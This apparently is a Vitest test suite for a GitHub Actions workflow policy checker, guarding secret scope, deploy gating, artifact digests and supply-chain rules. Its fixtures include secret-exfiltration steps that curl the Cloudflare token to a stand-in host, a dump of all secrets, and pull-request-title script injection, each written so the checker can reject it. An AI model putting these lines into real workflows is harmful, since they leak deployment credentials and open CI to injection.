/**
 * Workflow policy (ROADMAP P0-03 acceptance):
 * - "A grep test shows that no job except the deploy jobs references the
 *   Cloudflare secret."
 * - "Deploy jobs cannot run on a PR": each deploy job's `if:` is a plain
 *   conjunction that is false for every pull_request context (the run logs
 *   on GitHub show the jobs skipped; see docs/ops/ci.md).
 * - "A PR runs verify and fails on a failing test": verify is unconditional,
 *   runs on pull_request and runs the unit tests with no continue-on-error.
 */
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  checkWorkflow,
  DEPLOY_JOBS,
  DEPLOY_SECRET,
  evaluateConjunction,
  parseConjunction,
  readJobs,
  readLines,
} from '../src/workflow/policy.ts';
import { REPO_ROOT } from './scratch.ts';

const CI = readFileSync(join(REPO_ROOT, '.github/workflows/ci.yml'), 'utf8');
const REVIEW = readFileSync(join(REPO_ROOT, '.github/workflows/safety-review.yml'), 'utf8');

function mutate(source: string, from: string, to: string): string {
  expect(source.includes(from), `test fixture: '${from}' not found`).toBe(true);
  return source.replace(from, to);
}

const rules = (source: string, file = 'ci.yml'): string[] => [...new Set(checkWorkflow(file, source).map((f) => f.rule))];

describe('the real workflows', () => {
  it('pass the policy', () => {
    expect(checkWorkflow('ci.yml', CI)).toEqual([]);
    expect(checkWorkflow('safety-review.yml', REVIEW)).toEqual([]);
  });

  it('grep: only the deploy jobs mention the Cloudflare secret, and both do', () => {
    const jobs = readJobs(readLines(CI));
    expect(jobs.map((j) => j.name)).toEqual(['verify', 'build', 'e2e', 'e2e-fake-serial', 'attest', 'deploy-staging', 'deploy-production']);
    const mentioning = jobs.filter((j) => j.lines.some((l) => l.text.includes(DEPLOY_SECRET) || /\bsecrets\b/.test(l.text))).map((j) => j.name);
    expect(mentioning).toEqual([...DEPLOY_JOBS]);
    // Nothing outside the jobs block mentions it either (comments aside).
    const beforeJobs = CI.slice(0, CI.indexOf('\njobs:\n'));
    const code = beforeJobs.split('\n').filter((l) => !l.trimStart().startsWith('#'));
    expect(code.some((l) => l.includes(DEPLOY_SECRET) || /\bsecrets\b/.test(l))).toBe(false);
    expect(REVIEW.split('\n').filter((l) => !l.trimStart().startsWith('#')).some((l) => /\bsecrets\b|CLOUDFLARE/.test(l))).toBe(false);
  });

  it('deploy jobs evaluate to false for every pull_request context and true only for a push to main', () => {
    const jobs = readJobs(readLines(CI)).filter((j) => DEPLOY_JOBS.includes(j.name));
    expect(jobs).toHaveLength(2);
    for (const job of jobs) {
      const condition = job.lines.find((l) => l.indent === 4 && l.text.startsWith('if:'))?.text.slice(3).trim() ?? '';
      const terms = parseConjunction(condition);
      expect(terms, job.name).toBeDefined();
      const t = terms ?? [];
      for (const ref of ['refs/pull/7/merge', 'refs/heads/main', 'refs/heads/feature']) {
        for (const enabled of ['true', 'false', '']) {
          const ctx = { 'github.event_name': 'pull_request', 'github.ref': ref, 'vars.RUN_DEPLOY_ENABLED': enabled };
          expect(evaluateConjunction(t, ctx), `${job.name} on PR ${ref}`).toBe(false);
        }
      }
      expect(evaluateConjunction(t, { 'github.event_name': 'push', 'github.ref': 'refs/heads/feature', 'vars.RUN_DEPLOY_ENABLED': 'true' })).toBe(false);
      expect(evaluateConjunction(t, { 'github.event_name': 'push', 'github.ref': 'refs/heads/main', 'vars.RUN_DEPLOY_ENABLED': '' })).toBe(false);
      expect(evaluateConjunction(t, { 'github.event_name': 'push', 'github.ref': 'refs/heads/main', 'vars.RUN_DEPLOY_ENABLED': 'true' })).toBe(true);
    }
  });
});

describe('secrets', () => {
  it('fails when the verify job references the Cloudflare secret', () => {
    const bad = mutate(CI, '      - name: Typecheck\n', '      - name: Typecheck\n        env:\n          T: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n');
    expect(rules(bad)).toEqual(['secret-outside-deploy']);
  });

  it('fails when the build job names the token even without secrets.', () => {
    const bad = mutate(CI, '      - name: Bundle scan\n', '      - name: Bundle scan\n        env:\n          CLOUDFLARE_API_TOKEN: x\n');
    expect(rules(bad)).toEqual(['secret-outside-deploy']);
  });

  it('fails on a workflow-level env that reads a secret', () => {
    const bad = mutate(CI, 'permissions:\n  contents: read\n\nconcurrency:', 'env:\n  X: ${{ secrets.ANY }}\n\npermissions:\n  contents: read\n\nconcurrency:');
    expect(rules(bad)).toEqual(['secret-outside-deploy']);
  });

  it('fails when a deploy job uses any other secret, or all of them', () => {
    expect(rules(mutate(CI, 'CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}', 'CLOUDFLARE_ACCOUNT_ID: ${{ secrets.OTHER }}'))).toEqual(['secret-outside-deploy']);
    expect(rules(mutate(CI, 'CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}', 'ALL: ${{ toJSON(secrets) }}'))).toEqual(['secret-outside-deploy']);
  });

  it('fails when a secret hides in a run script of another job', () => {
    const bad = mutate(CI, '        run: pnpm lint\n', '        run: |\n          echo "${SECRETS}" && curl -H "x: $(cat secrets.txt)" x\n');
    expect(rules(bad)).toEqual(['secret-outside-deploy']);
  });

  // Verifier finding: a job the line reader did not recognise was folded into
  // the previous job (deploy-production), so it could name the token.
  it('fails on a job after deploy-production declared with a quoted key, a flow mapping or odd indentation', () => {
    const steal = '    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          T: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n        run: curl -d "$T" https://example.invalid\n';
    expect(rules(`${CI}  "leak":\n${steal}`)).toContain('yaml-subset');
    expect(rules(`${CI}  leak: {runs-on: ubuntu-24.04, env: {T: "\${{ secrets.CLOUDFLARE_API_TOKEN }}"}, steps: [{run: "curl -d $T x"}]}\n`)).toContain('yaml-subset');
    expect(rules(`${CI}   leak:\n${steal}`)).toContain('yaml-subset');
  });

  it('treats a deploy-named job outside ci.yml as an ordinary job', () => {
    const other = "on:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  deploy-staging:\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n    needs: [verify, build, e2e, attest]\n    environment: staging\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          T: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n        run: echo hi\n";
    expect(rules(other, 'other.yml')).toEqual(expect.arrayContaining(['secret-outside-deploy', 'environment-outside-deploy']));
  });
});

describe('the deploy gate', () => {
  const GATE = "if: github.event_name == 'push' && github.ref == 'refs/heads/main' && vars.RUN_DEPLOY_ENABLED == 'true'\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    environment:\n      name: staging";

  it('fails without the main-branch condition', () => {
    expect(rules(mutate(CI, GATE, GATE.replace(" && github.ref == 'refs/heads/main'", '')))).toEqual(['deploy-gate']);
  });

  it('fails with an || that would let a PR through', () => {
    expect(rules(mutate(CI, GATE, GATE.replace(" && vars.RUN_DEPLOY_ENABLED == 'true'", " || github.event_name == 'pull_request'")))).toEqual(['deploy-gate']);
  });

  it('fails with a negation or a function in the condition', () => {
    expect(rules(mutate(CI, GATE, GATE.replace("github.event_name == 'push'", "!cancelled() && github.event_name == 'push'")))).toEqual(['deploy-gate']);
  });

  it('fails when the condition is removed', () => {
    expect(rules(mutate(CI, GATE, GATE.replace(/^if: .*\n/, '')))).toEqual(['deploy-gate']);
  });

  it('fails when a deploy job does not need e2e', () => {
    expect(rules(mutate(CI, 'needs: [verify, build, e2e, e2e-fake-serial, attest]\n', 'needs: [verify, build, e2e-fake-serial, attest]\n'))).toEqual(['deploy-gate']);
  });

  it('fails when a deploy job does not need e2e-fake-serial (P0-14)', () => {
    expect(rules(mutate(CI, 'needs: [verify, build, e2e, e2e-fake-serial, attest]\n', 'needs: [verify, build, e2e, attest]\n'))).toEqual(['deploy-gate']);
    expect(rules(mutate(CI, 'needs: [verify, build, e2e, e2e-fake-serial, attest, deploy-staging]\n', 'needs: [verify, build, e2e, attest, deploy-staging]\n'))).toEqual([
      'deploy-gate',
    ]);
  });

  it('fails when a deploy job uses the wrong environment, or none', () => {
    expect(rules(mutate(CI, '      name: staging\n', '      name: production\n'))).toEqual(['deploy-gate']);
    expect(rules(mutate(CI, '    environment:\n      name: production\n      url: https://run.synthetos.com\n', ''))).toEqual(['deploy-gate']);
  });

  it('fails when another job uses an environment', () => {
    expect(rules(mutate(CI, '  e2e:\n    name: e2e\n', '  e2e:\n    name: e2e\n    environment: production\n'))).toEqual(['environment-outside-deploy']);
  });

  it('fails when a deploy job is renamed away', () => {
    expect(rules(mutate(CI, '  deploy-production:\n', '  ship-it:\n'))).toContain('deploy-gate');
  });
});

describe('bundle scan targets (P1-00)', () => {
  it('the production deploy must scan as production', () => {
    expect(rules(mutate(CI, 'node tools/gates/src/bundle/cli.ts --target production deploy-site', 'node tools/gates/src/bundle/cli.ts --target staging deploy-site'))).toEqual(['bundle-scan-target']);
  });

  it('the build job and the staging deploy must scan as staging', () => {
    expect(rules(mutate(CI, 'run: node a/tools/gates/src/bundle/cli.ts --target staging a/apps/web/dist', 'run: node a/tools/gates/src/bundle/cli.ts --target production a/apps/web/dist'))).toEqual(['bundle-scan-target']);
    expect(rules(mutate(CI, 'node tools/gates/src/bundle/cli.ts --target staging deploy-site', 'node tools/gates/src/bundle/cli.ts --target production deploy-site'))).toEqual(['bundle-scan-target']);
  });

  it('a scan without a target, or with two, fails', () => {
    expect(rules(mutate(CI, 'node tools/gates/src/bundle/cli.ts --target production deploy-site', 'node tools/gates/src/bundle/cli.ts deploy-site'))).toEqual(['bundle-scan-target']);
    expect(rules(mutate(CI, 'node tools/gates/src/bundle/cli.ts --target production deploy-site', 'node tools/gates/src/bundle/cli.ts --target production deploy-site --target staging'))).toEqual(['bundle-scan-target']);
  });

  it('dropping the production scan fails', () => {
    expect(rules(mutate(CI, '          node tools/gates/src/bundle/cli.ts --target production deploy-site\n', ''))).toEqual(['bundle-scan-target']);
  });

  it('a scan in any other job fails', () => {
    expect(rules(mutate(CI, '        run: pnpm -r test\n', '        run: pnpm -r test\n      - run: node tools/gates/src/bundle/cli.ts --target staging apps/web/dist\n'))).toEqual(['bundle-scan-target']);
  });
});

describe('verify', () => {
  it('fails when verify becomes conditional', () => {
    expect(rules(mutate(CI, '  verify:\n    name: verify\n', "  verify:\n    name: verify\n    if: github.event_name == 'push'\n"))).toEqual(['verify-job']);
  });

  it('fails when verify stops running the tests', () => {
    expect(rules(mutate(CI, '        run: pnpm -r test\n', '        run: echo skipped\n'))).toEqual(['verify-job']);
  });

  it('fails when CI no longer runs on pull requests', () => {
    expect(rules(mutate(CI, 'on:\n  pull_request:\n    branches: [main]\n', 'on:\n'))).toEqual(['verify-job']);
  });

  it('fails on continue-on-error anywhere', () => {
    expect(rules(mutate(CI, '        run: pnpm -r test\n', '        run: pnpm -r test\n        continue-on-error: true\n'))).toEqual(['continue-on-error']);
  });
});

describe('the e2e-fake-serial job (P0-14)', () => {
  const HEAD = '  e2e-fake-serial:\n    name: e2e-fake-serial\n    needs: [build]\n';
  const BUILD = '      - name: Build the fake-serial test artifact\n        run: pnpm build:fake-serial\n';
  const DIFF = '        run: node tools/gates/src/artifact/diff-cli.ts site apps/web/dist-fake-serial\n';
  const SUITE = '        run: pnpm --filter @synthetos/e2e e2e:fake-serial\n';

  it('must exist (deploy needs it) and be unconditional and need build', () => {
    const start = CI.indexOf('  e2e-fake-serial:\n');
    const end = CI.indexOf('  attest:\n');
    expect(rules(CI.slice(0, start) + CI.slice(end))).toEqual(['deploy-gate']);
    expect(rules(mutate(CI, HEAD, "  e2e-fake-serial:\n    name: e2e-fake-serial\n    if: github.event_name == 'push'\n    needs: [build]\n"))).toEqual(['fake-serial-job']);
    // Without needs: build it also cannot read the build digests.
    expect(rules(mutate(CI, HEAD, '  e2e-fake-serial:\n    name: e2e-fake-serial\n'))).toEqual(['fake-serial-job', 'artifact-digest']);
  });

  it('must build, verify, diff and run the suite, in that order', () => {
    expect(rules(mutate(CI, BUILD, ''))).toEqual(['fake-serial-job']);
    expect(rules(mutate(CI, DIFF, '        run: echo skipped\n'))).toEqual(['fake-serial-job']);
    expect(rules(mutate(CI, SUITE, '        run: echo skipped\n'))).toEqual(['fake-serial-job']);
    const swapped = mutate(mutate(CI, DIFF, '        run: PLACEHOLDER\n'), SUITE, DIFF).replace('        run: PLACEHOLDER\n', SUITE);
    expect(rules(swapped)).toEqual(['fake-serial-job']);
  });

  it('must build before it downloads the artifact into the checkout', () => {
    const download = '      - name: Download the artifact\n        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: run-web\n          path: artifact\n';
    const fakeJob = CI.slice(CI.indexOf(HEAD));
    expect(fakeJob.includes(BUILD + download)).toBe(true);
    const moved = CI.replace(HEAD, '@@HEAD@@').replace(BUILD + download, download + BUILD).replace('@@HEAD@@', HEAD);
    // The first occurrence of BUILD+download is in this job (the e2e job has no BUILD step).
    expect(rules(moved)).toEqual(['fake-serial-job']);
  });

  it('may not upload anything, nor name the artifact variables', () => {
    const upload = '      - name: Upload\n        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n        with:\n          name: fake\n          path: apps/web/dist-fake-serial\n';
    expect(rules(mutate(CI, SUITE, SUITE + upload))).toEqual(['fake-serial-job']);
    expect(rules(mutate(CI, SUITE, `${SUITE}        env:\n          RUN_E2E_SITE: apps/web/dist\n`))).toEqual(['fake-serial-job']);
  });
});

describe('the e2e job (P0-06)', () => {
  it('fails when it becomes conditional or stops needing build', () => {
    expect(rules(mutate(CI, '  e2e:\n    name: e2e\n    needs: [build]\n', "  e2e:\n    name: e2e\n    if: github.event_name == 'push'\n    needs: [build]\n"))).toEqual(['e2e-job']);
    expect(rules(mutate(CI, '  e2e:\n    name: e2e\n    needs: [build]\n', '  e2e:\n    name: e2e\n'))).toEqual(['e2e-job', 'artifact-digest']);
  });

  it('fails when the suite would not serve the extracted artifact', () => {
    expect(rules(mutate(CI, '      RUN_E2E_SITE: ${{ github.workspace }}/site\n', ''))).toEqual(['e2e-job']);
    expect(rules(mutate(CI, '      RUN_E2E_WORKER: ${{ github.workspace }}/worker\n', '      RUN_E2E_WORKER: ${{ github.workspace }}/elsewhere\n'))).toEqual(['e2e-job']);
  });

  it('fails when a step redirects the suite away from the job-level artifact paths', () => {
    const suite = '        run: pnpm --filter @synthetos/e2e e2e\n';
    expect(rules(mutate(CI, suite, `${suite}        env:\n          RUN_E2E_SITE: apps/web/dist\n`))).toEqual(['e2e-job']);
    const step = '      - name: Playwright against wrangler dev serving the artifact (T-S25, origin guard)\n';
    expect(rules(mutate(CI, step, `      - name: Redirect\n        run: echo "RUN_E2E_WORKER=elsewhere" >> "$GITHUB_ENV"\n${step}`))).toEqual(['e2e-job']);
  });

  it('fails when the artifact is not verified, the suite or the canary is dropped, or they run out of order', () => {
    expect(rules(mutate(CI, '          node tools/gates/src/repro/cli.ts verify site artifact/run-web.sha256\n          tar -xf artifact/run-worker.tar', '          tar -xf artifact/run-worker.tar'))).toEqual(['e2e-job']);
    expect(rules(mutate(CI, '        run: pnpm --filter @synthetos/e2e canary\n', '        run: echo skipped\n'))).toEqual(['e2e-job']);
    expect(rules(mutate(CI, '        run: pnpm --filter @synthetos/e2e e2e\n', '        run: echo skipped\n'))).toEqual(['e2e-job']);
    const swapped = mutate(
      mutate(CI, '        run: pnpm --filter @synthetos/e2e e2e\n', '        run: PLACEHOLDER\n'),
      '        run: pnpm --filter @synthetos/e2e canary\n',
      '        run: pnpm --filter @synthetos/e2e e2e\n',
    ).replace('        run: PLACEHOLDER\n', '        run: pnpm --filter @synthetos/e2e canary\n');
    expect(rules(swapped)).toEqual(['e2e-job']);
  });
});

describe('artifact digests (P0 review: artifact poisoning)', () => {
  /** Only the job's own section of ci.yml, so a mutation touches exactly one job. */
  function inJob(job: string, from: string, to: string): string {
    const start = CI.indexOf(`\n  ${job}:\n`);
    expect(start, job).toBeGreaterThan(-1);
    const next = CI.slice(start + 1).search(/\n  [a-z-]+:\n/);
    const end = next === -1 ? CI.length : start + 1 + next;
    const section = CI.slice(start, end);
    expect(section.includes(from), `${job}: '${from}' not found`).toBe(true);
    return CI.slice(0, start) + section.replace(from, to) + CI.slice(end);
  }

  it.each(['e2e', 'e2e-fake-serial', 'attest', 'deploy-staging', 'deploy-production'])('fails when %s drops the digest check', (job) => {
    expect(rules(inJob(job, '          sha256sum --check --strict artifact-digests.txt\n', ''))).toEqual(['artifact-digest']);
  });

  it.each(['e2e', 'attest', 'deploy-production'])('fails when %s takes a digest from anywhere but the build outputs', (job) => {
    expect(rules(inJob(job, '${{ needs.build.outputs.run-web-tar }}', '${{ needs.e2e.outputs.run-web-tar }}'))).toContain('artifact-digest');
  });

  it('fails when attest signs before it checks', () => {
    const moved = inJob(
      'attest',
      '      - name: Check the downloaded artifact is the bytes the build job produced\n',
      '      - name: Attest early\n        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n      - name: Check the downloaded artifact is the bytes the build job produced\n',
    );
    expect(rules(moved)).toEqual(['artifact-digest']);
  });

  it('fails when a deploy extracts the artifact before it checks', () => {
    const moved = inJob(
      'deploy-staging',
      '      - name: Check the downloaded artifact is the bytes the build job produced\n',
      '      - name: Early extract\n        run: tar -xf artifact/run-web.tar -C early\n      - name: Check the downloaded artifact is the bytes the build job produced\n',
    );
    expect(rules(moved)).toEqual(['artifact-digest']);
  });

  it('fails when the build job stops publishing a digest, or records it after the upload', () => {
    expect(rules(inJob('build', '      run-worker-tar: ${{ steps.digests.outputs.run-worker-tar }}\n', ''))).toEqual(['artifact-digest']);
    expect(rules(inJob('build', `            echo "run-web-tar=$(sha256sum artifact/run-web.tar | cut -d' ' -f1)"\n`, ''))).toEqual(['artifact-digest']);
    expect(rules(inJob('build', '        id: digests\n', ''))).toEqual(['artifact-digest']);
  });
});

describe('undo a failed deployment (P0 review)', () => {
  it.each(['staging', 'production'])('fails when deploy-%s loses its undo step, its condition or the deploy id', (env) => {
    const undo = `        run: node tools/gates/src/deploy/rollback-cli.ts ${env} ci/deploy-toolchain/node_modules/.bin/wrangler\n`;
    expect(rules(mutate(CI, undo, ''))).toEqual(['deploy-rollback']);
    const step = `      - name: Undo the deployment when a step after it failed (staging is deleted, production rolled back)\n        if: failure() && steps.deploy.outcome == 'success'\n`;
    const start = CI.indexOf(`  deploy-${env}:\n`);
    const at = CI.indexOf(step, start);
    expect(at).toBeGreaterThan(-1);
    const always = CI.slice(0, at) + step.replace("failure() && steps.deploy.outcome == 'success'", 'always()') + CI.slice(at + step.length);
    expect(rules(always)).toEqual(['deploy-rollback']);
    const idAt = CI.indexOf('        id: deploy\n', start);
    const noId = CI.slice(0, idAt) + CI.slice(idAt + '        id: deploy\n'.length);
    expect(rules(noId)).toEqual(['deploy-rollback']);
  });
});

describe('supply chain and injection', () => {
  it('fails on an action pinned by tag', () => {
    expect(rules(mutate(CI, 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1', 'actions/checkout@v7'))).toEqual(['unpinned-action']);
    expect(rules(mutate(CI, 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1', 'actions/checkout@3d3c42e'))).toEqual(['unpinned-action']);
  });

  it('fails on pull_request_target and workflow_run', () => {
    expect(rules(mutate(CI, 'on:\n  pull_request:\n', 'on:\n  pull_request_target:\n  pull_request:\n'))).toEqual(['banned-trigger']);
    expect(rules(mutate(REVIEW, 'on:\n', 'on:\n  workflow_run:\n    workflows: [ci]\n'), 'safety-review.yml')).toEqual(['banned-trigger']);
  });

  it('fails on ${{ }} inside a run script, single-line or block', () => {
    expect(rules(mutate(CI, '        run: pnpm lint\n', '        run: echo "${{ github.event.pull_request.title }}"\n'))).toEqual(['expression-in-run']);
    expect(rules(mutate(CI, '          mkdir -p artifact\n', '          mkdir -p artifact-${{ github.head_ref }}\n'))).toEqual(['expression-in-run']);
  });

  it('allows ${{ }} in env:, which is how values reach scripts', () => {
    expect(rules(REVIEW, 'safety-review.yml')).toEqual([]);
    expect(REVIEW).toContain('PR_BODY: ${{ github.event.pull_request.body }}');
  });

  it('fails on write permissions outside the attest job, and on write-all', () => {
    expect(rules(mutate(CI, '  build:\n    name: build\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: read\n', '  build:\n    name: build\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: read\n      id-token: write\n'))).toEqual(['write-permission']);
    expect(rules(mutate(CI, 'permissions:\n  contents: read\n\nconcurrency:', 'permissions: write-all\n\nconcurrency:'))).toEqual(['write-permission']);
    expect(rules(mutate(CI, 'permissions:\n  contents: read\n\nconcurrency:', 'permissions:\n  contents: write\n\nconcurrency:'))).toEqual(['write-permission']);
  });

  it('fails on YAML anchors, aliases and merge keys', () => {
    expect(rules(mutate(CI, '  verify:\n    name: verify\n', '  verify: &v\n    name: verify\n'))).toContain('yaml-subset');
    expect(rules(mutate(CI, '  e2e:\n    name: e2e\n', '  e2e:\n    <<: *v\n    name: e2e\n'))).toContain('yaml-subset');
  });

  it('fails on tabs', () => {
    expect(rules(mutate(CI, '        run: pnpm lint\n', '\t\trun: pnpm lint\n'))).toContain('yaml-subset');
  });
});

describe('the condition reader', () => {
  it('accepts only conjunctions of equalities', () => {
    expect(parseConjunction("github.event_name == 'push' && github.ref == 'refs/heads/main'")).toEqual([
      { path: 'github.event_name', value: 'push' },
      { path: 'github.ref', value: 'refs/heads/main' },
    ]);
    expect(parseConjunction("${{ github.ref == 'refs/heads/main' }}")).toEqual([{ path: 'github.ref', value: 'refs/heads/main' }]);
    for (const bad of ['', "a == 'x' || b == 'y'", "!(a == 'x')", "a != 'x'", "startsWith(github.ref, 'refs/heads/')", "a == b"]) {
      expect(parseConjunction(bad), bad).toBeUndefined();
    }
  });
});
